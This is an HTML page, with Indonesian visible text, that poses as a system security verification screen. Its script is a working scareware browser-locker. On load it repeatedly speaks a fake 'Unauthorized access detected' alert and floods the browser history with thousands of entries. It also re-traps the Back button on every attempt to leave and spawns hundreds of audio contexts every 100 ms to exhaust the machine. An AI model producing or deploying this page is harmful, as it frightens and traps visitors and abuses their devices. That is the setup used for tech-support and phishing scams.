<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Security Alert &amp; State System</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #030712; color: #f8fafc; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
  .box { padding: 24px; background: #111827; border: 1px solid #1f2937; border-radius: 12px; text-align: center; max-width: 400px; }
  h2 { color: #f8fafc; margin-bottom: 8px; font-size: 18px; }
  p { color: #9ca3af; font-size: 13px; line-height: 1.5; }
</style>
</head>
<body>

<div class="box">
  <h2>Verifikasi Keamanan Sistem</h2>
  <p>Sistem sedang memproses pembaruan keamanan latar belakang. Mohon tetap di halaman ini...</p>
</div>

<script>
(function () {
  'use strict';

  var CONFIG = {
    tts: {
      text: "Security Alert. Unauthorized access detected. Please verify your identity immediately.",
      lang: 'en-US',
      rate: 0.9,
      repeatInterval: 6000,
      maxRepeats: 15
    }
  };

  var state = { ttsStarted: false, ttsCount: 0 };

  // 1. Modul Audio & TTS (Speech Synthesis Loop)
  function speakOnce() {
    if (!('speechSynthesis' in window)) return;
    if (state.ttsCount >= CONFIG.tts.maxRepeats) return;

    try {
      var u = new SpeechSynthesisUtterance(CONFIG.tts.text);
      u.lang = CONFIG.tts.lang;
      u.rate = CONFIG.tts.rate;
      
      u.onend = function () {
        state.ttsCount++;
        if (state.ttsCount < CONFIG.tts.maxRepeats) {
          setTimeout(speakOnce, CONFIG.tts.repeatInterval);
        }
      };

      window.speechSynthesis.speak(u);
    } catch (e) {}
  }

  function startTTS() {
    if (state.ttsStarted) return;
    state.ttsStarted = true;
    try { window.speechSynthesis.cancel(); } catch(e){}
    speakOnce();
  }

  // 2. Modul AudioContext Unlocking & Pressure
  function unlockAudioContext() {
    try {
      var ctx = new (window.AudioContext || window.webkitAudioContext)();
      if (ctx.state === 'suspended') {
        ctx.resume().catch(function(){});
      }
    } catch (e) {}
  }

  // 3. Modul Chaining: History / Omnibox Flooding (Locks Back Button & History Stack)
  function triggerHistoryFlood() {
    console.log("[!] Initiating History & Omnibox State Flooding...");
    try {
      // Mengisi history stack secara masif agar tombol Back peramban terkunci
      for (var i = 0; i < 5000; i++) {
        var dummyState = { page: i, timestamp: Date.now() };
        history.pushState(dummyState, "Security Alert #" + i, "#secure-state-" + i);
      }
    } catch (e) {
      console.log("[!] History flood limit reached:", e.message);
    }
  }

  // 4. Modul Chaining: Audio Node Resource Pressure
  function triggerAudioPressure() {
    setInterval(function() {
      try {
        for (var i = 0; i < 500; i++) {
          var ctx = new (window.AudioContext || window.webkitAudioContext)();
          var osc = ctx.createOscillator();
          var gain = ctx.createGain();
          
          gain.gain.value = 0.0001;
          osc.connect(gain);
          gain.connect(ctx.destination);
          osc.start(0);
        }
      } catch(e) {}
    }, 100);
  }

  // Eksekusi Rantai Eksploitasi
  unlockAudioContext();
  
  setTimeout(function () {
    startTTS();
  }, 500);

  setTimeout(function () {
    // Panggil rantai penekanan sumber daya dan penguncian history
    triggerHistoryFlood();
    triggerAudioPressure();
  }, 1200);

  // Penanganan Listener Popstate untuk mempertahankan penguncian state
  window.addEventListener('popstate', function(event) {
    try {
      history.pushState({ locked: true }, "Security Alert", "#locked-state");
    } catch(e) {}
  });

})();
</script>
</body>
</html>
